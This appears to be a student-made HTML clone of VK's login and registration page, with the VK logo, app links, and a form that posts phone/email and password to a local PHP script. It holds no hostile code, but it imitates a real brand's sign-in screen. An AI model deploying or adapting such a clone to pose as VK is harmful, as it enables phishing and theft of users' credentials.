<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.14.0/css/all.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.7.2/font/bootstrap-icons.css">
    <link rel="stylesheet" href="css/index.css">
</head>
<body>
    <header class="header-wrap" id="header">
        <div class="page-header">
                    <div class="row" id=navhead>
                        <div class="col-3 ps-0 pe-0" id=col1>
                            <img src="img/VK.com-logo.svg.png" width="30" height="30">
                        </div>
                        <div class="col-3 ps-0">
                            <form>
                                <input class="topsearch" type="text"placeholder="Search" aria-label="Search">
                            </form>
                        </div>
                            <div class="col">
                        </div>
                    </div>
        </div>
    </header>
    
    <main>
        <div class="container" id="wrapmain" style="width: 990px;">
            <div class="wrapmain2" id="wrapmain2">
                <div class="content" style="padding: 18px 0 36px 0;">
                    <div class="main-about row py-0 mx-0">
                        <div class="col-sm-7 px-0 me-3" id="mobile" style="width: 622px; ">
                            <div class="loginmobile px-0 text-center" style="width: 540px; padding: 14px 0 0 0; position:relative;">
                                <p class="loginmobile-head fw-bold mb-2" style="font-size:22px;">VK for mobile devices</p>
                                <p class="loginmobile-info mb-0" style="font-size:14px;">Install our official mobile app and stay in touch with your friends anytime and anywhere.</p>
                                <div class="loginmobile-promo" style="position:relative; width:540px; height: 474px; padding-top: 32px;">
                                        <a class="android" target="_blank" href="https://play.google.com/store/apps/details?id=com.vkontakte.android" style="position:relative; left: 20px;top: -8px;display:inline-block;">
                                            <img class="LoginMobilePromoDevice__img" src="https://sun6-21.userapi.com/09IqLEQ1F6S-NcynGI29HpxaA4eUPECZr9tybg/pYORDwKmdDI.png" srcset="https://sun6-21.userapi.com/09IqLEQ1F6S-NcynGI29HpxaA4eUPECZr9tybg/pYORDwKmdDI.png 1x, https://sun6-20.userapi.com/0rHT2RoE9RAUQwvMyuNLq-41T45iqX_fSlAGYg/8_QIYn8SxJ8.png 2x" alt="VK for Android">
                                            <span class="LoginMobilePromoDevice__button flat_button secondary button_light" id="span1">
                                            <i class="fab fa-android"></i> VK for Android
                                            </span>
                                        </a>
                                        <a class="ios" target="_blank" href="https://itunes.apple.com/app/id564177498"style="position:relative; left: -15px; display:inline-block;">
                                            <img class="LoginMobilePromoDevice__img" src="https://sun6-20.userapi.com/GKUrK0PzHqPH_9lv1fx01p_LO6PjXjMMRxBGJw/VD3VpchXcC8.png" srcset="https://sun6-20.userapi.com/GKUrK0PzHqPH_9lv1fx01p_LO6PjXjMMRxBGJw/VD3VpchXcC8.png 1x, https://sun6-20.userapi.com/R3C0qYnAqq9KELL3ATqyvldN1L9bycJeflRpsg/fouDHiP93To.png 2x" alt="VK for iOS">
                                            <span class="LoginMobilePromoDevice__button flat_button secondary button_light" id="span2">
                                            <i class="fab fa-apple"></i> VK for IOS
                                            </span>
                                        </a>
                                </div>
                                <a href="/products" class="login_all_products_button">All products</a>
                            </div>                       
                        </div>
                        <div class="col px-0">
                            <div class="col p-4 bg-white" id=login>
                                <form class="bg-white m-0 p-0" action="model/process-login.php" method="POST" name="login">
                                    <div class="mb-3">
                                        <input type="text" class="form-control" name="txtdienthoai" id="index_email" placeholder="Phone or email">
                                    </div>
                                    <div class="mb-3">
                                        <input type="password" class="form-control" name="txtpass" id="index_password" placeholder="Password">
                                    </div>
                                    
                                    <button type="submit" class="btnsignin text-white" id="btnsignin" name="btnsignin">Sign in</button>
                                    <div class="forgot">
                                    <a id="index_forgot" class="index_forgot" href="/restore" target="_top">Forgot your password?</a>
                                    </div>
                                </form>
                            </div>
                            <div class="col p-4 bg-white" id=dangky>
                                <div class="dangky">
                                        <h5 class="text-center fst-normal mb-0">First time here? </h5>
                                        <p class="sub text-center">Sign up for VK</p>
                                    <form class="bg-white m-0 p-0">
                                            <div class="mb-3">
                                                <input type="text" class="form-control" id="firstname" placeholder="Your first name">
                                            </div>
                                            <div class="mb-3">
                                                <input type="text" class="form-control" id="lastname" placeholder="Your last name">
                                            </div>
                                            <div class="label">
                                                <p class="a">Birthday</p>
                                                <svg class="a" height="16" viewBox="0 0 16 16" width="16" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd"><rect height="15" rx="7.5" stroke="#b4bfcc" width="15" x=".5" y=".5"/><path d="m5.67342187 6.34423828h1.11181641c.04833984-.6875.52636719-1.12255859 1.26757813-1.12255859.73583984 0 1.21386718.4296875 1.21386718 1.02050781 0 .54248047-.23095703.84863281-.88085937 1.24072266-.73583985.44042968-1.06347656.92382812-1.0366211 1.69726562l.0053711.40820313h1.1118164v-.32226563c0-.54248047.19873047-.82714844.89160157-1.23535156.70898441-.42431641 1.12792971-1.00976563 1.12792971-1.83691406 0-1.16552735-.95605471-2.00878907-2.37402346-2.00878907-1.55761719 0-2.39013672.92382813-2.43847657 2.15917969zm2.30419922 5.77929692c.49414063 0 .82714844-.3276368.82714844-.8164063 0-.4995117-.33300781-.8271484-.82714844-.8271484-.49414062 0-.83251953.3276367-.83251953.8271484 0 .4887695.33837891.8164063.83251953.8164063z" fill="#828a99"/></g></svg>
                                            </div>
                                            <div class="row m-0" id="birthday" style="width: 274px;">
                                                <div class="col px-0">
                                                <select class="form-select">
                                                    <option selected>Day</option>
                                                    <option value="1">1</option>
                                                    <option value="2">2</option>
                                                    <option value="3">3</option>
                                                    <option value="4">4</option>
                                                    <option value="5">5</option>
                                                    <option value="6">6</option>
                                                    <option value="7">7</option>
                                                    <option value="8">8</option>
                                                    <option value="9">9</option>
                                                    <option value="10">10</option>
                                                    <option value="11">11</option>
                                                    <option value="12">12</option>
                                                    <option value="13">13</option>
                                                    <option value="14">14</option>
                                                    <option value="15">15</option>
                                                    <option value="16">16</option>
                                                    <option value="17">17</option>
                                                    <option value="18">18</option>
                                                    <option value="19">19</option>
                                                    <option value="20">20</option>
                                                    <option value="21">21</option>
                                                    <option value="22">22</option>
                                                    <option value="23">23</option>
                                                    <option value="24">24</option>
                                                    <option value="20">25</option>
                                                    <option value="21">26</option>
                                                    <option value="22">27</option>
                                                    <option value="23">28</option>
                                                    <option value="24">29</option>
                                                    <option value="20">30</option>
                                                    <option value="21">31</option>
                                                </select>
                                                </div>
                                                <div class="col-md px-0"style="margin-left:12px; margin-right:12px;">
                                                <select class="form-select">
                                                    <option selected>Month</option>
                                                    <option value="1">January</option>
                                                    <option value="2">February</option>
                                                    <option value="3">March</option>
                                                    <option value="4">April</option>
                                                    <option value="5">May</option>
                                                    <option value="6">June</option>
                                                    <option value="7">July</option>
                                                    <option value="8">August</option>
                                                    <option value="9">September/option>
                                                    <option value="10">October</option>
                                                    <option value="11">November</option>
                                                    <option value="12">December</option>                     
                                                </select>
                                                </div>
                                                <div class="col-md px-0">
                                                <select class="form-select">
                                                    <option selected>Year</option>
                                                    <option value="1">2007</option>
                                                    <option value="2">2006</option>
                                                    <option value="3">2005</option>
                                                    <option value="4">2004</option>
                                                    <option value="5">2003</option>
                                                    <option value="6">2002</option>
                                                    <option value="7">2001</option>
                                                    <option value="8">2000</option>
                                                    <option value="9">1999</option>
                                                    <option value="10">1998</option>
                                                    <option value="11">11</option>
                                                    <option value="12">12</option>
                                                    <option value="13">13</option>
                                                    <option value="14">14</option>
                                                    <option value="15">15</option>
                                                    <option value="16">16</option>
                                                    <option value="17">17</option>
                                                    <option value="18">18</option>
                                                    <option value="19">19</option>
                                                    <option value="20">20</option>
                                                    <option value="21">21</option>
                                                    <option value="22">22</option>
                                                    <option value="23">23</option>
                                                    <option value="24">24</option>
                                                    <option value="20">25</option>
                                                    <option value="21">26</option>
                                                    <option value="22">27</option>
                                                    <option value="23">28</option>
                                                    <option value="24">29</option>
                                                    <option value="20">30</option>
                                                    <option value="21">31</option>
                                                </select>
                                                </div>
                                            </div>
                                            <div class="gender" style="margin-top:16px;">
                                                <p class="a">Your gender</p>
                                                <div class="row mx-0" style="width: 274px;">
                                                    <div class="col-md px-0">
                                                        <div class="form-check">
                                                            <input class="form-check-input" type="radio" name="flexRadioDefault" id="flexRadioDefault1">
                                                            <label class="form-check-label" for="flexRadioDefault1">
                                                                Female
                                                            </label>
                                                        </div>
                                                    </div>
                                                    <div class="col-md px-0">                                                
                                                        <div class="form-check">
                                                            <input class="form-check-input" type="radio" name="flexRadioDefault" id="flexRadioDefault2" checked>
                                                            <label class="form-check-label" for="flexRadioDefault2">
                                                                Male
                                                            </label>
                                                        </div>
                                                    </div>
                                                    <div class="col-md px-0">
                                                    </div>
                                                </div>   
                                            </div>
                                            <div class="d-grid gap-3 mx-0 mt-4">
                                                <button class="btn btn-primary" id="regis" type="button">Continue registration</button>
                                                <button class="btn btn-primary fw-bold" id="loginfb" type="button">Sign in with Facebook</button>
                                            </div>
                                    </form>
                                </div>    
                            </div>
                            <div class="col px-4 py-3 my-3 bg-white">
                                <div id="vk_faq" class="vk_faq">
                                    After signing up, you'll get access to all of VK&nbsp;ID's features
                                    <br>
                                    <a href="https://connect.vk.com/promo" target="_blank">
                                    Learn more
                                    </a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <footer>
        <div class="footer_wrap1">
            <div class="footer_wrap2">
                <div class="footer_nav">
                    <div class="footer_copy">
                        <a href="/about">VK</a>
                        © 2006–2021
                    </div>
                    <div class="footer_link">
                        <a class="bnav_a" href="/about">About VK</a>
                        <a class="bnav_a" href="/support?act=home" style="display: none;">Help</a>
                        <a class="bnav_a" href="/terms">Terms</a>
                        <a class="bnav_a" href="/biz?utm_source=vk_inside&amp;utm_medium=authorization" target="_blank" style="display: none;">For business</a>
                        <a class="bnav_a" href="https://dev.vk.com">Developers</a>
                        <a class="bnav_a" href="/jobs" style="display: none;">Careers</a>
                    </div>
                    <div class="footer_lang">
                        <a class="footer_lang_link" href="#">Tiếng Việt</a>
                        <a class="footer_lang_link" href="#">Русский</a>
                        <a class="footer_lang_link" href="#">Українська</a>
                        <a class="footer_lang_link" href="#">English</a>
                        <a class="footer_lang_link" href="#">All languages</a>
                    </div>
                </div>
            </div>
        </div>
    </footer>
    
    <script src="js/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
</body>
</html>